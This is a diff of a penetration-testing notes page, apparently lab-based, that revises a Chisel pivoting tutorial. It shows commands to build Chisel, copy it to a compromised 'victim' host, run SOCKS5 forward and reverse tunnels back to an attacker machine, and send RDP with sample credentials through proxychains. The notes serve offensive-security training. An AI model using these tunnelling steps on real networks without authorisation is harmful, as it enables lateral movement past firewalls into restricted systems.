@@ -11,38 +11,44 @@ description: >-
 
 {% embed url="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html" %}
 
-**Cloning Chisel**
+## **Installing Chisel**
+
+### Clone Repository
 
 ```shell-session
 attacker@kali$ git clone https://github.com/jpillora/chisel.git
 ```
 
-**Building the Chisel Binary**
+### B**uilding the Chisel Binary**
 
 ```shell-session
 attacker@kali$ cd chisel
 go build
 ```
 
-**We can use SCP to transfer the binary to the victim.**
+## Transfer Chisel Binary to Victim
 
-**Transferring Chisel Binary to Pivot Host**
+**Transferring Chisel Binary with SCP, A Web Server, or other methods of choice.**
 
 ```shell-session
 attacker@kali$ scp chisel victim@10.129.202.64:~/home/victim
 ```
 
-**Running the Chisel Server on the Pivot Host**
+## **Running Chisel Server - Jump Host Server**
+
+**We start a chisel server for a client to connect to.**
 
 ```shell-session
 victim@ubuntu$ ./chisel server -v -p 1234 --socks5
 ```
 
-The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and _**forward it to all the networks that are accessible on the pivot host.**_\
-\
-We can start a client on our attack host and connect to the Chisel server.
+<mark style="color:red;">**NOTE:**</mark> This can be on jump host, kali host, or whichever host we need it for.&#x20;
 
-**Connecting to the Chisel Server**
+Chisel will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and _**forward it to all the networks that are accessible on the pivot host.**_
+
+## Running Chisel Client
+
+<mark style="color:red;">**NOTE:**</mark> we can also run the chisel server on the Kali host.
 
 ```shell-session
 attacker@kali$ ./chisel client -v 10.129.202.64:1234 socks
@@ -74,27 +80,26 @@ socks5 127.0.0.1 1080
 attacker@kali$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
 
-
-
-### Chisle Reverse Pivot
+## Chisel Reverse Pivot - Kali Server
 
 In the previous example, we transfered a chisel binary to the compromised victim machine and started a listener on port 1234. Commonly, there will be scenarios where firewalls restrict inbound connections to our target. In such cases, we can use Chisel with the reverse tunnel option.
 
 With the Chisel --reverse (-R) enabled, The server (attack host) will listen and accept connections and then be proxied through the client.
 
-**Starting the Chisel Server on our Attack Host**
+### S**tarting the Chisel Server on our Attack Host**
 
 <pre class="language-shell-session"><code class="lang-shell-session"><strong>attacker@kali$ sudo ./chisel server --reverse -v -p 1234 --socks5
 </strong></code></pre>
 
 Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`
 
-**Connecting the Chisel Client to our Attack Host**\
-
+### C**onnecting the Chisel Client to our Attack Host**
 
 ```shell-session
-victim@ubuntu$ ./chisel client -v 10.10.14.17:1234 R:socks
+victim@ubuntu$ ./chisel client -v <kali-ip>:1234 R:socks
 ```
+
+_<mark style="color:red;">**NOTE:**</mark>** **<mark style="color:yellow;">**Chisel opens a port**</mark>** **<mark style="color:red;">**1080**</mark>** **<mark style="color:yellow;">**that we will use.**</mark>_
 
 _**Now we can modify proxychains.conf and add 1080 port so we can use it to pivot between 1080 and the tunnel.**_
 
